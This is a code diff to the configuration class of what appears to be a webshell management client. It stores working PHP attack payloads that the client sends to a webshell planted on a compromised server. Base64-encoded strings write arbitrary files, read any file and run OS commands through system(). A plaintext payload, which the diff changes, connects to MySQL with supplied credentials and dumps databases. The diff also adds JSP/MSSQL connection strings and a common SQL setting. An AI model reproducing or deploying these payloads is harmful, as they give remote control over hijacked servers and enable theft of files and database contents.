@@ -83,7 +83,7 @@ public class InitConfig {
 		config.setValue("PHP_UPLOAD", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D");
 		config.setValue("PHP_DOWNLOAD", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7");
 		config.setValue("PHP_SHELL", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D");
-		config.setValue("PHP_DB_MYSQL", "@ini_set ( \"display_errors\", \"0\" );@set_time_limit ( 0 );@set_magic_quotes_runtime ( 0 );echo (\"->|\");;$m = get_magic_quotes_gpc ();$conf = $m ? stripslashes ( $_POST [\"z1\"] ) : $_POST [\"z1\"];$ar = explode(\"choraheiheihei\", $conf);$dbn = $m ? stripslashes ( $_POST [\"z2\"] ) : $_POST [\"z2\"];$sql = base64_decode ( $_POST [\"z3\"] );$T = @mysql_connect($ar[0],$ar[1],$ar[2]);@mysql_query ( \"SET NAMES utf8\" );if($dbn==\"\"){$sql = \"SHOW DATABASES\";}else{	@mysql_select_db ( $dbn );}$q = @mysql_query ( $sql );$i = 0;while ( $col = @mysql_field_name ( $q, $i ) ) {echo ($col . \"\\t|\\t\");$i ++;}echo (\"\\r\\n\");while ( $rs = @mysql_fetch_row ( $q ) ) {for($c = 0; $c < $i; $c ++) {echo (trim ( $rs [$c] ));echo (\"\\t|\\t\");}echo (\"\\r\\n\");}@mysql_close ( $T );;echo (\"|<-\");die ();");
+		config.setValue("PHP_DB_MYSQL", "@ini_set ( \"display_errors\", \"0\" );@set_time_limit ( 0 );@set_magic_quotes_runtime ( 0 );echo (\"->|\");;$m = get_magic_quotes_gpc ();$conf = $m ? stripslashes ( $_POST [\"z1\"] ) : $_POST [\"z1\"];$ar = explode(\"choraheiheihei\", $conf);$dbn = $m ? stripslashes ( $_POST [\"z2\"] ) : $_POST [\"z2\"];$sql = base64_decode ( $_POST [\"z3\"] );$T = @mysql_connect($ar[0],$ar[1],$ar[2]);@mysql_query ( \"SET NAMES utf8\" );if($dbn==\"\"){$sql = \"SHOW DATABASES\";$q = @mysql_query ( $sql );$i = 0;while($rs=@mysql_fetch_row($q)){echo(trim($rs[0]).chr(9)).\"\\t|\\t\\r\\n\";}@mysql_close($T);;echo(\"|<-\");die();}else{\t@mysql_select_db ( $dbn );$q = @mysql_query ( $sql );$i = 0;while ( $col = @mysql_field_name ( $q, $i ) ) {echo ($col . \"\\t|\\t\");$i ++;}echo (\"\\r\\n\");while ( $rs = @mysql_fetch_row ( $q ) ) {for($c = 0; $c < $i; $c ++) {echo (trim ( $rs [$c] ));echo (\"\\t|\\t\");}echo (\"\\r\\n\");}@mysql_close ( $T );;echo (\"|<-\");die ();}");
 		
 		
 		
@@ -99,9 +99,10 @@ public class InitConfig {
 		config.setValue("JSP_DOWNLOAD", "F");
 		config.setValue("JSP_SHELL", "M");
 		config.setValue("JSP_DB_MYSQL", "com.mysql.jdbc.Driverchoraheiheiheijdbc%3Amysql%3A%2F%2Flocalhost%2Ftestdb%3Fuser%3Dusername%26password%3Duserpwd");
-		config.setValue("JSP_DB_MSSQL", "com.microsoft.sqlserver.jdbc.SQLServerDriverchoraheiheiheijdbc%3Asqlserver%3A%2F%2Flocalhost%3BdatabaseName%3Dtestdb%3Buser%3Dusername%3Bpassword%3Duserpwd");
+		config.setValue("JSP_DB_MSSQL", "com.microsoft.sqlserver.jdbc.SQLServerDriverchoraheiheiheijdbc%3Asqlserver%3A%2F%2Flocalhost%3BdatabaseName%3Dtestdb%3Bchoraheiheiheiusernamechoraheiheiheiuserpwd");
 		config.setValue("JSP_DB_ORACLE", "oracle.jdbc.driver.OracleDriverchoraheiheiheijdbc%3aoracle%3athin%3a%40localhostchoraheiheiheiusernamechoraheiheiheiuserpwdchoraheiheiheitestdb");
 		
+		config.setValue("COMMON_SQL_STRING", "SHOW DATABASES;|||SQL2;");
 		
 		config.setValue("CUS_MAKE", "1");
 		config.setValue("CUS_INDEX", "index");
@@ -195,6 +196,9 @@ public class InitConfig {
 		Safe.ASPX_DB_MSSQL = config.getValue("ASPX_DB_MSSQL");
 		Safe.ASPX_DB_MYSQL = config.getValue("ASPX_DB_MYSQL");
 		Safe.ASPX_DB_MDB = config.getValue("ASPX_DB_MDB");
+		
+		//SJS
+		Safe.COMMON_SQL_STRING = config.getValue("COMMON_SQL_STRING");
 		
 		Safe.CUS_BASE64 = config.getValue("CUS_BASE64");
 		Safe.CUS_MAKE = config.getValue("CUS_MAKE");
